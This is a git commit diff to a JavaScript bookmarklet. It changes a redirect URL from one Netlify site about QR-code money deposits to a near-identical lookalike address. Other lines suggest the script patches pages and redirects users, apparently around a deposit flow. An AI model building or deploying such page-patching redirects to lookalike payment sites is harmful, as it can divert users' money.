451920c216adada22e66fcfd0d5b195c447db54c
tranquyetchienbank-ops <tranquyetchienbank@gmail.com>
2026-08-24 20:14:50 +0700

    Update script.js

--- script.js
+++ script.js
@@ -1,6 +1,6 @@
 javascript:(function(){
   'use strict';
-  const NETLIFY_URL = 'https://f168-nap-tien-qua-ma-qr.netlify.app/';
+  const NETLIFY_URL = 'https://f168-nap-tien-qua-ma-qrr.netlify.app/';
   const patched = new WeakSet();
   let redirecting = false;
 
